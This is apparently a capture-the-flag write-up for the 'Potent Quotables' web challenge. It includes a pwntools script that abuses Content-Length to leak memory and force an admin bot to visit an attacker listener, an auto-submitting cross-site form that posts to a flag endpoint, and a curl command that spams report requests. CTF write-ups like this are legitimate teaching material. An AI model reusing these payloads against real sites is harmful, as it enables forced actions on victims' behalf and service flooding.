# Potent Quotables

We found a Heartbleed-like way of solving this and I thought it would be interesting to do a write up on it.

Summary:     
1. [Run script on your server to listen to `quotables.pwni.ng:1337`](#listener)     
1. [Make a payload containing POST to `/api/flag` on another page/server](#post-payload)
1. [Spam reports to admin so he visits your server containing your payload](#spam-reports)

/api/flag only takes POST requests, so we eventually figured that we have to create a page that makes an xhr POST request to it.

##### Listener
Content-length takes a maximum of 2048 bytes.      
This will force the admin bot to visit your server with the memory leak.

```
from pwn import *
import time

request = """POST /report HTTP/1.1\r
Host: quotables.pwni.ng:1337\r
Content-Length: 100\r
Content-Type: application/x-www-form-urlencoded\r
Connection: close\r
\r
path=http://your-listener.com:1337/?"""

while True:
        p = remote("quotables.pwni.ng", 1337)
        # p = remote("127.0.0.1", 1337)
        p.send(request)
        p.close()
p.interactive()
```


##### Post Payload
```
<iframe name="iframe_id" src=""></iframe>

<form id="formlol" method="POST" action="http://quotables.pwni.ng:1337/api/flag" target="iframe_id">
<input type="submit" value="go">
</form>

<script>
    setInterval(function(){
        document.getElementById("formlol").submit();
    }, 50)
</script>

```

##### Spam reports
```
curl -i -s -k  -X $'POST' \
    -H $'Host: quotables.pwni.ng:1337' -H $'User-Agent: Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://quotables.pwni.ng:1337/quote' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 34' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    --data-binary $'path=https://your-server.com/ddos.html' \
    $'http://quotables.pwni.ng:1337/report'
```



*Courtesy of Team OTA / OpenBlue*
